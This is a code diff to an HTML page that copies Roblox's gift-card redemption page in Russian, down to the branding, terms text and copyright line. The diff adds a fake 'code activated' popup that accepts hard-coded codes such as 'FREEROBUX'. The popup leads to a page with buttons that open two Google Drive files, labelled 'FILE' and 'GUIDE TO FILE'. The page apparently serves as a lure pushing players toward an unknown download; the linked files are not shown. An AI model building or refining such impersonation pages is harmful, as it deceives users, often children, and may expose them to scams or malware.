@@ -881,6 +881,170 @@
             font-size: 12px;
             line-height: 1.4;
         }
+
+        /* НОВЫЕ СТИЛИ ДЛЯ ВСПЛЫВАЮЩЕГО ОКНА КАК НА СКРИНШОТЕ */
+        .success-popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1004;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .success-popup {
+            background: white;
+            border-radius: 12px;
+            padding: 30px 24px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+        }
+        
+        .success-popup-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        
+        .success-popup-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        
+        .success-popup-btn {
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 600;
+            position: relative;
+            transition: all 0.2s ease;
+        }
+        
+        .success-popup-primary {
+            background: #000000;
+            color: white;
+        }
+        
+        .success-popup-primary:hover {
+            background: #333333;
+        }
+        
+        .success-popup-primary:active::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: #000000;
+            border-radius: 1px;
+        }
+        
+        .success-popup-primary:active {
+            transform: translateY(1px);
+            outline: none;
+        }
+
+        /* Стили для страницы с файлами */
+        .files-page {
+            display: none;
+        }
+        
+        .files-container {
+            background: white;
+            border-radius: 12px;
+            padding: 30px 24px;
+            max-width: 440px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            margin: 20px auto;
+        }
+        
+        .files-title {
+            color: #333;
+            margin-bottom: 24px;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        
+        .files-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .file-btn {
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            font-weight: 600;
+            position: relative;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .file-btn-primary {
+            background: #000000;
+            color: white;
+        }
+        
+        .file-btn-primary:hover {
+            background: #333333;
+        }
+        
+        .file-btn-secondary {
+            background: #00a2ff;
+            color: white;
+        }
+        
+        .file-btn-secondary:hover {
+            background: #0088cc;
+        }
+        
+        .file-btn:active::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: currentColor;
+            border-radius: 1px;
+            opacity: 0.7;
+        }
+        
+        .file-btn:active {
+            transform: translateY(1px);
+            outline: none;
+        }
+        
+        .files-back-link {
+            color: #007bff;
+            text-decoration: none;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 16px;
+        }
         
         @media (max-width: 768px) {
             .top-nav {
@@ -1125,72 +1289,103 @@
     <!-- Затемнение фона при открытом меню -->
     <div class="side-menu-overlay" id="side-menu-overlay"></div>
 
-    <div class="container">
-        <h1>Активировать коды Roblox</h1>
-        <p class="subtitle">Введите ниже вашу подарочную карту, виртуальный предмет или промокод.</p>
-        
-        <div class="code-label">Код</div>
-        
-        <div class="code-input-container">
-            <input type="text" class="code-input" placeholder="Введите код" id="code-input" maxlength="20">
-        </div>
-        
-        <!-- Блок с точками, который появляется при активации -->
-        <div class="activation-dots" id="activation-dots">••••••••</div>
-        
-        <div class="terms-container">
-            <input type="checkbox" id="terms-checkbox" class="terms-checkbox">
-            <label for="terms-checkbox" class="terms">
-                Отмечая это поле, вы подтверждаете, что вам исполнилось 18 лет, или что вы являетесь родителем или законным опекуном владельца учётной записи, и соглашаетесь с нашими <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Условиями использования</a>, включая арбитражную оговорку и <a href="https://en.help.roblox.com/hc/en-us/articles/115005566223-How-Do-I-Redeem-a-Gift-Card-" target="_blank">Условия использования подарочных карт</a>, а также с нашей <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-Policy" target="_blank">Политикой конфиденциальности</a>. Вы также подтверждаете и соглашаетесь с тем, что сумма, указанная на лицевой стороне вашей подарочной карты, будет эквивалентна кредиту Roblox в вашей местной валюте.
-            </label>
-        </div>
-        
-        <button class="redeem-btn" id="redeem-btn" disabled>Выкупать</button>
-        
-        <div class="photo-section">
-            <img src="https://i.postimg.cc/L5ZWhGH5/90e6639469a816169ab104e8bc2070a1-roblox-gift-card.png" alt="Roblox Gift Card" class="gift-card-image">
-        </div>
-        
-        <div class="info-panel">
-            <div class="info-title">Дополнительная информация</div>
-            <ul class="info-list">
-                <li><a href="https://www.youtube.com/watch?v=6fL1Dk3j4qk" target="_blank">Как использовать подарочные карты (видео)</a></li>
-                <li><a href="https://en.help.roblox.com/hc/en-us/articles/115005566223-How-Do-I-Redeem-a-Gift-Card-" target="_blank">Дополнительная информация о подарочных картах</a></li>
-                <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать коды виртуальных предметов</a></li>
-                <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать промокоды</a></li>
-            </ul>
-        </div>
-        
-        <div class="footer">
-            <div class="language-selector">
-                <select>
-                    <option>Русский</option>
-                    <option>English</option>
-                    <option>Español</option>
-                    <option>Português</option>
-                    <option>Français</option>
-                    <option>Deutsch</option>
-                    <option>한국어</option>
-                    <option>日本語</option>
-                    <option>中文</option>
-                </select>
+    <!-- Главная страница активации -->
+    <div id="activation-page">
+        <div class="container">
+            <h1>Активировать коды Roblox</h1>
+            <p class="subtitle">Введите ниже вашу подарочную карту, виртуальный предмет или промокод.</p>
+            
+            <div class="code-label">Код</div>
+            
+            <div class="code-input-container">
+                <input type="text" class="code-input" placeholder="Введите код" id="code-input" maxlength="20">
             </div>
             
-            <div class="footer-links">
-                <a href="https://www.roblox.com/info/about" target="_blank">О нас</a>
-                <a href="https://corp.roblox.com/careers/" target="_blank">Работа</a>
-                <a href="https://blog.roblox.com/" target="_blank">Блог</a>
-                <a href="https://corp.roblox.com/parents/" target="_blank">Родители</a>
-                <a href="https://www.roblox.com/gamecards" target="_blank">Подарочные карты</a>
-                <a href="https://en.help.roblox.com/hc/en-us" target="_blank">Помощь</a>
-                <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Условия</a>
-                <a href="https://corp.roblox.com/accessibility/" target="_blank">Доступность</a>
-                <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-Policy" target="_blank">Конфиденциальность</a>
-                <a href="https://www.roblox.com/info/privacy" target="_blank">Ваш выбор конфиденциальности</a>
-                <a href="https://www.roblox.com/sitemap" target="_blank">Карта сайта</a>
+            <!-- Блок с точками, который появляется при активации -->
+            <div class="activation-dots" id="activation-dots">••••••••</div>
+            
+            <div class="terms-container">
+                <input type="checkbox" id="terms-checkbox" class="terms-checkbox">
+                <label for="terms-checkbox" class="terms">
+                    Отмечая это поле, вы подтверждаете, что вам исполнилось 18 лет, или что вы являетесь родителем или законным опекуном владельца учётной записи, и соглашаетесь с нашими <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Условиями использования</a>, включая арбитражную оговорку и <a href="https://en.help.roblox.com/hc/en-us/articles/115005566223-How-Do-I-Redeem-a-Gift-Card-" target="_blank">Условия использования подарочных карт</a>, а также с нашей <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-Policy" target="_blank">Политикой конфиденциальности</a>. Вы также подтверждаете и соглашаетесь с тем, что сумма, указанная на лицевой стороне вашей подарочной карты, будет эквивалентна кредиту Roblox в вашей местной валюте.
+                </label>
             </div>
             
-            <p class="copyright">©2025 Roblox Corporation. Roblox, логотип Roblox и Powering Imagination являются нашими зарегистрированными и незарегистрированными товарными знаками в США и других странах.</p>
+            <button class="redeem-btn" id="redeem-btn" disabled>Выкупать</button>
+            
+            <div class="photo-section">
+                <img src="https://i.postimg.cc/L5ZWhGH5/90e6639469a816169ab104e8bc2070a1-roblox-gift-card.png" alt="Roblox Gift Card" class="gift-card-image">
+            </div>
+            
+            <div class="info-panel">
+                <div class="info-title">Дополнительная информация</div>
+                <ul class="info-list">
+                    <li><a href="https://www.youtube.com/watch?v=6fL1Dk3j4qk" target="_blank">Как использовать подарочные карты (видео)</a></li>
+                    <li><a href="https://en.help.roblox.com/hc/en-us/articles/115005566223-How-Do-I-Redeem-a-Gift-Card-" target="_blank">Дополнительная информация о подарочных картах</a></li>
+                    <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать коды виртуальных предметов</a></li>
+                    <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать промокоды</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer">
+                <div class="language-selector">
+                    <select>
+                        <option>Русский</option>
+                        <option>English</option>
+                        <option>Español</option>
+                        <option>Português</option>
+                        <option>Français</option>
+                        <option>Deutsch</option>
+                        <option>한국어</option>
+                        <option>日本語</option>
+                        <option>中文</option>
+                    </select>
+                </div>
+                
+                <div class="footer-links">
+                    <a href="https://www.roblox.com/info/about" target="_blank">О нас</a>
+                    <a href="https://corp.roblox.com/careers/" target="_blank">Работа</a>
+                    <a href="https://blog.roblox.com/" target="_blank">Блог</a>
+                    <a href="https://corp.roblox.com/parents/" target="_blank">Родители</a>
+                    <a href="https://www.roblox.com/gamecards" target="_blank">Подарочные карты</a>
+                    <a href="https://en.help.roblox.com/hc/en-us" target="_blank">Помощь</a>
+                    <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Условия</a>
+                    <a href="https://corp.roblox.com/accessibility/" target="_blank">Доступность</a>
+                    <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-Policy" target="_blank">Конфиденциальность</a>
+                    <a href="https://www.roblox.com/info/privacy" target="_blank">Ваш выбор конфиденциальности</a>
+                    <a href="https://www.roblox.com/sitemap" target="_blank">Карта сайта</a>
+                </div>
+                
+                <p class="copyright">©2025 Roblox Corporation. Roblox, логотип Roblox и Powering Imagination являются нашими зарегистрированными и незарегистрированными товарными знаками в США и других странах.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- НОВОЕ ВСПЛЫВАЮЩЕЕ ОКНО КАК НА СКРИНШОТЕ -->
+    <div class="success-popup-overlay" id="success-popup-overlay">
+        <div class="success-popup">
+            <div class="success-popup-title">Код успешно активирован</div>
+            <div class="success-popup-buttons">
+                <button class="success-popup-btn success-popup-primary" onclick="goToFilesPage()">Вернуться к погашению</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- СТРАНИЦА С ФАЙЛАМИ -->
+    <div id="files-page" class="files-page">
+        <div class="files-container">
+            <h1 class="files-title">Доступные файлы</h1>
+            
+            <div class="files-buttons">
+                <button class="file-btn file-btn-primary" onclick="openFile()">
+                    📂 ФАЙЛ
+                </button>
+                <button class="file-btn file-btn-secondary" onclick="openGuide()">
+                    📖 ГАЙД НА ФАЙЛ
+                </button>
+            </div>
+            
+            <a href="#" class="files-back-link" onclick="backToActivation()">← Вернуться к активации кодов</a>
         </div>
     </div>
 
@@ -1252,6 +1447,11 @@
         const leaveOverlay = document.getElementById('leave-overlay');
         const leaveCancelBtn = document.getElementById('leave-cancel-btn');
         const leaveContinueBtn = document.getElementById('leave-continue-btn');
+        
+        // НОВЫЕ ЭЛЕМЕНТЫ
+        const successPopupOverlay = document.getElementById('success-popup-overlay');
+        const activationPage = document.getElementById('activation-page');
+        const filesPage = document.getElementById('files-page');
         
         // Список действительных кодов
         const validCodes = ["SPIDERCOLA", "TWEETROBLOX", "ROBLOXEDU", "FREEROBUX", "DDJ", "FREENGNISDI"];
@@ -1364,7 +1564,8 @@
                 
                 // Проверка кода
                 if (validCodes.includes(code.toUpperCase())) {
-                    showSuccessAlert();
+                    // ПОКАЗЫВАЕМ НОВОЕ ВСПЛЫВАЮЩЕЕ ОКНО (как на скриншоте)
+                    successPopupOverlay.style.display = 'flex';
                 } else {
                     alert('Неверный код. Проверьте ввод и попробуйте снова.');
                     // Скрываем точки при ошибке
@@ -1373,6 +1574,36 @@
             }, 2000);
         });
         
+        // НОВАЯ ФУНКЦИЯ: Перейти на страницу с файлами
+        function goToFilesPage() {
+            successPopupOverlay.style.display = 'none';
+            activationPage.style.display = 'none';
+            filesPage.style.display = 'block';
+        }
+        
+        // НОВАЯ ФУНКЦИЯ: Открыть файл
+        function openFile() {
+            window.open('https://drive.google.com/file/d/1fSeKGQrkFYeV_5sUwFTGY0od896oq5lS/view?usp=drive_link', '_blank');
+        }
+        
+        // НОВАЯ ФУНКЦИЯ: Открыть гайд
+        function openGuide() {
+            window.open('https://drive.google.com/file/d/10lCHjf6oZsN_FmHqR2ZeNNBkh4D5yTRl/view', '_blank');
+        }
+        
+        // НОВАЯ ФУНКЦИЯ: Вернуться к активации
+        function backToActivation() {
+            filesPage.style.display = 'none';
+            activationPage.style.display = 'block';
+            
+            // Сбрасываем форму
+            codeInput.value = '';
+            activationDots.style.display = 'none';
+            termsCheckbox.checked = false;
+            redeemBtn.disabled = true;
+        }
+
+        // СТАРАЯ ФУНКЦИЯ (оставлена для совместимости)
         function showSuccessAlert() {
             // Показываем всплывающее оповещение
             alertOverlay.style.display = 'flex';
